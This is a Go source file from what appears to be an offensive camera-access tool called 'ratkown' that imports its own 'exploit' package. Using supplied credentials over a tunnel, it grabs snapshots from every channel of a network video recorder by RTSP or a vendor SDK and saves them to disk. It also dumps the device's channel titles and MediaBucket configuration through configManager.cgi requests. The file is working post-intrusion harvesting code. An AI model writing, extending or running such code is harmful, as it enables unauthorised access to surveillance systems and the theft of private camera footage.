package scan

import (
	"encoding/base64"
	"fmt"
	"os"
	"path/filepath"
	"strings"
	"time"
	"ratkown/ratkown/exploit"
	"ratkown/ratkown/net"
	"ratkown/ratkown/types"
	"ratkown/ratkown/ui"
)

func NVRHopFull(tunnel *net.PTCPTunnel, serial, login, pass, model string, channels int, outDir string, img types.ImageConfig) {
	if !types.IsNVRModel(model) || channels < 2 {
		return
	}

	ui.TUIThread(fmt.Sprintf("[\x1b[95mNVR %dch\x1b[0m] %s — hopping", channels, serial))

	tunnel.SetAuth(login, pass)
	os.MkdirAll(filepath.Join(outDir, "snapshots"), 0755)

	for ch := 1; ch <= channels; ch++ {
		fpath := filepath.Join(outDir, "snapshots", fmt.Sprintf("%s_CH%02d.jpg", serial, ch))
		done := false

		if img.Rtsp {
			if raw, err := tunnel.RTSPSnapshot(ch, 5*time.Second); err == nil && len(raw) > 100 {
				if clean, ok := exploit.ExtractBestJPEG(raw); ok && exploit.IsDecodableJPEG(clean) {
					os.WriteFile(fpath, clean, 0644)
					ui.TUIThread(fmt.Sprintf("CH%02d \x1b[92m✓\x1b[0m", ch))
					done = true
				}
			}
		}

		if !done && img.Sdk {
			sdk := net.NewSDKClient(tunnel, login, pass)
			if raw, err := sdk.GetSnapshot(ch); err == nil && len(raw) > 100 {
				if clean, ok := exploit.ExtractBestJPEG(raw); ok && exploit.IsDecodableJPEG(clean) {
					os.WriteFile(fpath, clean, 0644)
					ui.TUIThread(fmt.Sprintf("CH%02d \x1b[92m✓\x1b[0m (sdk)", ch))
					done = true
				}
			}
		}

		if !done {
			ui.TUIThread(fmt.Sprintf("CH%02d ·", ch))
		}
	}

	extractNVRChannelInfo(tunnel, serial, login, pass, channels, outDir)
}

func extractNVRChannelInfo(tunnel *net.PTCPTunnel, serial, login, pass string, channels int, outDir string) {
	tunnel.SetAuth(login, pass)

	req := "GET /cgi-bin/configManager.cgi?action=getConfig&name=ChannelTitle HTTP/1.1\r\n" +
		"Host: 127.0.0.1\r\n" +
		"Authorization: Basic " + base64.StdEncoding.EncodeToString([]byte(login+":"+pass)) + "\r\n" +
		"\r\n"
	resp, err := tunnel.DoHTTPAuthStrict([]byte(req), 5*time.Second)
	if err != nil || len(resp) == 0 {
		return
	}

	fpath := filepath.Join(outDir, "nvr_channels.txt")
	f, ferr := os.Create(fpath)
	if ferr != nil {
		return
	}
	defer f.Close()

	body := string(resp)
	for ch := 0; ch < channels; ch++ {
		titleKey := fmt.Sprintf("table.ChannelTitle[%d]", ch)
		if idx := strings.Index(body, titleKey); idx >= 0 {
			rest := body[idx:]
			if nl := strings.Index(rest, "\n"); nl > 0 {
				parts := strings.SplitN(rest[:nl], "=", 2)
				if len(parts) == 2 {
					f.WriteString(fmt.Sprintf("CH%02d %s\n", ch+1, strings.TrimSpace(parts[1])))
				}
			}
		}
	}

	req2 := "GET /cgi-bin/configManager.cgi?action=getConfig&name=MediaBucket HTTP/1.1\r\n" +
		"Host: 127.0.0.1\r\n" +
		"Authorization: Basic " + base64.StdEncoding.EncodeToString([]byte(login+":"+pass)) + "\r\n" +
		"\r\n"
	resp2, err2 := tunnel.DoHTTPAuthStrict([]byte(req2), 5*time.Second)
	if err2 == nil && len(resp2) > 0 {
		f.WriteString("\n--- MediaBucket ---\n")
		f.WriteString(string(resp2))
	}
}
